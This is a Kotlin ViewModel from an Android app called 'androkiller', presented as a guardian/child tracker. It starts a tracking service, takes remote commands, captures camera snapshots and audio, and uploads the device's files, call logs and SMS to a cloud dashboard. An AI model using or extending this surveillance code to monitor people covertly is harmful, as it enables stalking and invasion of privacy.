package com.nexus.androkiller.ui.main

import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.nexus.androkiller.data.TrackerRepository
import com.nexus.androkiller.model.CommandMessage
import com.nexus.androkiller.model.FamilyMessage
import com.nexus.androkiller.model.LocationData
import com.nexus.androkiller.model.StorageInfo
import com.nexus.androkiller.service.TrackerForegroundService
import com.nexus.androkiller.tracker.AudioRecorderManager
import com.nexus.androkiller.tracker.CameraSnapshotManager
import com.nexus.androkiller.tracker.DeviceStatusProvider
import com.nexus.androkiller.tracker.PermissionManager
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.io.File
import java.util.UUID

data class TrackerUiState(
    val deviceId: String = "",
    val isServiceRunning: Boolean = false,
    val permissions: Map<String, Boolean> = emptyMap(),
    val hasAllPermissions: Boolean = false,
    val batteryLevel: Int = 0,
    val isCharging: Boolean = false,
    val lastLocation: LocationData? = null,
    val intervalSeconds: Long = 15L,
    val statusMessage: String = "Ready",
    val recentCommands: List<CommandMessage> = emptyList(),
    val storageInfo: StorageInfo = StorageInfo(),
    val guardianPhone: String = "+18005550199",
    val familyMessages: List<FamilyMessage> = emptyList()
)

class MainScreenViewModel : ViewModel() {

    private val _uiState = MutableStateFlow(TrackerUiState())
    val uiState: StateFlow<TrackerUiState> = _uiState.asStateFlow()

    private var repository: TrackerRepository? = null
    private var statusProvider: DeviceStatusProvider? = null

    fun initialize(context: Context) {
        if (statusProvider == null) {
            statusProvider = DeviceStatusProvider(context)
            repository = TrackerRepository(context)

            val provider = statusProvider!!
            val (battery, charging) = provider.getBatteryInfo()
            val perms = PermissionManager.getAllPermissionsStatus(context)
            val storage = provider.getStorageInfo()
            val phone = provider.getGuardianPhone()

            _uiState.update {
                it.copy(
                    deviceId = provider.getDeviceId(),
                    isServiceRunning = TrackerForegroundService.isServiceRunning,
                    permissions = perms,
                    hasAllPermissions = PermissionManager.hasAllEssentialPermissions(context),
                    batteryLevel = battery,
                    isCharging = charging,
                    storageInfo = storage,
                    guardianPhone = phone
                )
            }

            // Listen for command updates in UI
            repository?.subscribeToCommands(provider.getDeviceId()) { command ->
                _uiState.update { state ->
                    val updated = (listOf(command) + state.recentCommands).take(10)
                    state.copy(recentCommands = updated)
                }
            }

            // Listen for family messages
            repository?.subscribeToMessages(provider.getDeviceId()) { messages ->
                _uiState.update { state ->
                    state.copy(familyMessages = messages)
                }
            }
        } else {
            refreshState(context)
        }
    }

    fun refreshState(context: Context) {
        val provider = statusProvider ?: DeviceStatusProvider(context)
        val (battery, charging) = provider.getBatteryInfo()
        val perms = PermissionManager.getAllPermissionsStatus(context)
        val storage = provider.getStorageInfo()
        val phone = provider.getGuardianPhone()

        _uiState.update {
            it.copy(
                isServiceRunning = TrackerForegroundService.isServiceRunning,
                permissions = perms,
                hasAllPermissions = PermissionManager.hasAllEssentialPermissions(context),
                batteryLevel = battery,
                isCharging = charging,
                storageInfo = storage,
                guardianPhone = phone
            )
        }
    }

    fun updateDeviceId(context: Context, newId: String) {
        val provider = statusProvider ?: DeviceStatusProvider(context)
        provider.setDeviceId(newId)
        _uiState.update { it.copy(deviceId = newId) }
    }

    fun updateGuardianPhone(context: Context, newPhone: String) {
        val provider = statusProvider ?: DeviceStatusProvider(context)
        provider.setGuardianPhone(newPhone)
        _uiState.update { it.copy(guardianPhone = newPhone) }
    }

    fun callGuardian(context: Context) {
        val phone = _uiState.value.guardianPhone
        val intent = Intent(Intent.ACTION_DIAL).apply {
            data = Uri.parse("tel:$phone")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        try {
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    fun sendReplyMessage(context: Context, text: String) {
        if (text.isBlank()) return
        val deviceId = _uiState.value.deviceId
        val msg = FamilyMessage(
            id = UUID.randomUUID().toString(),
            deviceId = deviceId,
            sender = "CHILD",
            text = text.trim(),
            timestamp = System.currentTimeMillis()
        )

        // Add to local state immediately
        _uiState.update { state ->
            state.copy(familyMessages = state.familyMessages + msg)
        }

        viewModelScope.launch {
            repository?.sendFamilyMessage(msg)
        }
    }

    fun setInterval(seconds: Long) {
        _uiState.update { it.copy(intervalSeconds = seconds) }
    }

    fun startTrackingService(context: Context) {
        val state = _uiState.value
        val intent = Intent(context, TrackerForegroundService::class.java).apply {
            action = TrackerForegroundService.ACTION_START_TRACKING
            putExtra(TrackerForegroundService.EXTRA_INTERVAL_SECONDS, state.intervalSeconds)
        }
        ContextCompat.startForegroundService(context, intent)
        _uiState.update {
            it.copy(
                isServiceRunning = true,
                statusMessage = "Foreground tracking service activated"
            )
        }
    }

    fun stopTrackingService(context: Context) {
        val intent = Intent(context, TrackerForegroundService::class.java).apply {
            action = TrackerForegroundService.ACTION_STOP_TRACKING
        }
        context.startService(intent)
        _uiState.update {
            it.copy(
                isServiceRunning = false,
                statusMessage = "Tracking service stopped"
            )
        }
    }

    fun triggerManualSnapshot(context: Context, lifecycleOwner: androidx.lifecycle.LifecycleOwner? = null) {
        _uiState.update { it.copy(statusMessage = "📸 Capturing camera snapshot...") }
        val cameraManager = CameraSnapshotManager(context)
        val deviceId = _uiState.value.deviceId
        cameraManager.takeSnapshot(
            lifecycleOwner = lifecycleOwner,
            useFrontCamera = false,
            onSuccess = { photoFile ->
                viewModelScope.launch {
                    val res = repository?.uploadMediaFile(photoFile, "IMAGE", deviceId)
                    if (res?.isSuccess == true) {
                        _uiState.update { it.copy(statusMessage = "✅ Snapshot captured & uploaded (${photoFile.name})") }
                    } else {
                        _uiState.update { it.copy(statusMessage = "Photo saved: ${photoFile.name}") }
                    }
                }
            },
            onError = { ex ->
                _uiState.update { it.copy(statusMessage = "❌ Camera capture error: ${ex.message}") }
            }
        )
    }

    fun triggerManualAudio(context: Context, durationSeconds: Int = 10) {
        val intent = Intent(context, TrackerForegroundService::class.java).apply {
            action = TrackerForegroundService.ACTION_RECORD_AUDIO
            putExtra(TrackerForegroundService.EXTRA_DURATION_SECONDS, durationSeconds)
        }
        if (TrackerForegroundService.isServiceRunning) {
            context.startService(intent)
            _uiState.update { it.copy(statusMessage = "Audio recording started (${durationSeconds}s)...") }
        } else {
            // Record directly using AudioRecorderManager
            _uiState.update { it.copy(statusMessage = "Recording ${durationSeconds}s audio clip...") }
            val recorder = AudioRecorderManager(context)
            val deviceId = _uiState.value.deviceId
            recorder.startRecording(durationSeconds) { audioFile ->
                if (audioFile != null) {
                    viewModelScope.launch {
                        val res = repository?.uploadMediaFile(audioFile, "AUDIO", deviceId, durationSeconds)
                        if (res?.isSuccess == true) {
                            _uiState.update { it.copy(statusMessage = "✅ Audio uploaded (${audioFile.name})") }
                        } else {
                            _uiState.update { it.copy(statusMessage = "Audio saved: ${audioFile.name}") }
                        }
                    }
                }
            }
        }
    }

    fun triggerManualScanFiles(context: Context) {
        _uiState.update { it.copy(statusMessage = "Scanning storage files...") }
        viewModelScope.launch {
            val fileMgr = com.nexus.androkiller.tracker.StorageFileManager(context)
            val res = fileMgr.scanAndSyncFiles(_uiState.value.deviceId)
            if (res.isSuccess) {
                _uiState.update { it.copy(statusMessage = "✅ Synced ${res.getOrNull()} files to Web Dashboard") }
            } else {
                _uiState.update { it.copy(statusMessage = "File scan failed: ${res.exceptionOrNull()?.message}") }
            }
        }
    }

    fun syncEverything(context: Context) {
        _uiState.update { it.copy(statusMessage = "⚡ Syncing telemetry, files, call logs & SMS...") }
        startTrackingService(context)

        viewModelScope.launch {
            val deviceId = _uiState.value.deviceId
            val fileMgr = com.nexus.androkiller.tracker.StorageFileManager(context)
            val callSmsMgr = com.nexus.androkiller.tracker.CallSmsManager(context)

            val fileRes = fileMgr.scanAndSyncFiles(deviceId)
            val callRes = callSmsMgr.syncCallLogsToFirestore(deviceId)
            val smsRes = callSmsMgr.syncSmsToFirestore(deviceId)

            val fileCount = fileRes.getOrDefault(0)
            val callCount = callRes.getOrDefault(0)
            val smsCount = smsRes.getOrDefault(0)

            _uiState.update {
                it.copy(
                    isServiceRunning = true,
                    statusMessage = "✅ Everything Synced! ($fileCount files, $callCount calls, $smsCount SMS)"
                )
            }
        }
    }
}
